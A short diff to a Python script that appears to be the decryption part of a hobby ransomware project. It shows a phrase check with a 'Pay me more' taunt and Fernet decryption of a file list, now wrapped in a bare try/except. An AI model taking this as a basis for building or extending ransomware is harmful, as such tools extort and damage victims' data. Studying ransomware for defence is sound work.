@@ -22,20 +22,23 @@ enteredPhrase = input("Enter valid phrase to decrypt the files\n")
 if (secretPhrase != enteredPhrase):
     print(" 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 ")
 else:
-    # Read the encryptedKey.key file
-    with open("encryptedKey.key", "rb") as encryptedKey:
-        secretKey = encryptedKey.read()
+    try:
+        # Read the encryptedKey.key file
+        with open("encryptedKey.key", "rb") as encryptedKey:
+            secretKey = encryptedKey.read()
 
-    # Iterate the loop over the files list
-    for file in files:
-        # Read and decrypt the file data
-        with open(file, "rb") as theFile:
-            rawData = theFile.read()
-        decryptedRawData = Fernet(secretKey).decrypt(rawData)
+        # Iterate the loop over the files list
+        for file in files:
+            # Read and decrypt the file data
+            with open(file, "rb") as theFile:
+                rawData = theFile.read()
+            decryptedRawData = Fernet(secretKey).decrypt(rawData)
 
-        # Update the same file with decrypted data
-        with open(file, "wb") as theFile:
-            theFile.write(decryptedRawData)
+            # Update the same file with decrypted data
+            with open(file, "wb") as theFile:
+                theFile.write(decryptedRawData)
 
-    # Notify the message to the user
-    print("You have successfully recovered all the files!!")
+        # Notify the message to the user
+        print("You have successfully recovered all the files!!")
+    except:
+        pass
